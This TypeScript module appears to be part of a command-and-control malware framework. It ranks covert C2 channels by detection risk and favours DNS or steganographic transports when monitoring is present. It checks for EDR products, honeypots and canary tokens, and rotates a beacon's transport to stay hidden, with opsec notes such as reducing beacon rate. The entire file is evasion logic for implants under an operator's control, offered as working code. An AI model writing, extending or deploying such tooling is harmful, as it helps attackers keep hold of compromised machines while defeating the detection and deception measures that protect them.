/**
 * @module c2_rotation
 * Adaptive C2 channel rotation with counter-intel feedback loop.
 */
import { LegitC2Server, type ServiceTransport } from "./c2_platform.ts"
import { auditDefenses } from "./counter_intel.ts"

export interface C2ChannelOption {
  name: string
  transport: ServiceTransport
  priority: number
  edrRisk: "low" | "medium" | "high"
}

export interface RotationDecision {
  selectedChannel: string
  reason: string
  edrDetected: string[]
  rotatedFrom?: string
  opsecNotes: string[]
}

export function rankChannels(
  channels: C2ChannelOption[],
  counterIntel: Awaited<ReturnType<typeof auditDefenses>>,
): C2ChannelOption[] {
  const edrCount = counterIntel.edrDetected?.length ?? 0
  return [...channels].sort((a, b) => {
    let scoreA = a.priority
    let scoreB = b.priority
    if (edrCount > 0) {
      const riskWeight = { low: 3, medium: 1, high: -2 }
      scoreA += riskWeight[a.edrRisk]
      scoreB += riskWeight[b.edrRisk]
    }
    if (counterIntel.networkMonitoring?.length) {
      if (a.name.includes("http") || a.name.includes("webhook")) scoreA -= 1
      if (a.name.includes("dns") || a.name.includes("stego")) scoreA += 1
    }
    return scoreB - scoreA
  })
}

export async function selectC2Channel(
  channels: C2ChannelOption[],
  opts: { live?: boolean; previousChannel?: string } = {},
): Promise<RotationDecision> {
  const counterIntel = auditDefenses({ live: opts.live ?? false, check: "all" })
  const ranked = rankChannels(channels, counterIntel)
  const selected = ranked[0]
  const opsecNotes: string[] = []

  if (counterIntel.edrDetected?.length) {
    opsecNotes.push(`EDR present (${counterIntel.edrDetected.join(", ")}) — prefer low-risk channel`)
  }
  if (counterIntel.honeypotDetected) {
    opsecNotes.push("Honeypot indicators — rotate channel and reduce beacon rate")
  }
  if (counterIntel.canaryTokensFound?.length) {
    opsecNotes.push(`Canary tokens: ${counterIntel.canaryTokensFound.slice(0, 3).join(", ")}`)
  }

  return {
    selectedChannel: selected?.name ?? "none",
    reason: selected
      ? `Ranked ${selected.name} (priority=${selected.priority}, edrRisk=${selected.edrRisk})`
      : "No channels available",
    edrDetected: counterIntel.edrDetected ?? [],
    rotatedFrom: opts.previousChannel,
    opsecNotes,
  }
}

export async function applyChannelRotation(
  server: LegitC2Server,
  beaconId: string,
  channels: C2ChannelOption[],
  opts: { live?: boolean } = {},
): Promise<RotationDecision & { applied: boolean }> {
  const decision = await selectC2Channel(channels, { live: opts.live })
  const channel = channels.find((c) => c.name === decision.selectedChannel)
  if (!channel) return { ...decision, applied: false }

  const session = server.sessions.get(beaconId)
  if (session) {
    session.transportName = channel.name
    session.metadata.lastRotation = new Date().toISOString()
    session.metadata.rotationReason = decision.reason
  }

  return { ...decision, applied: true }
}

export default { rankChannels, selectC2Channel, applyChannelRotation }
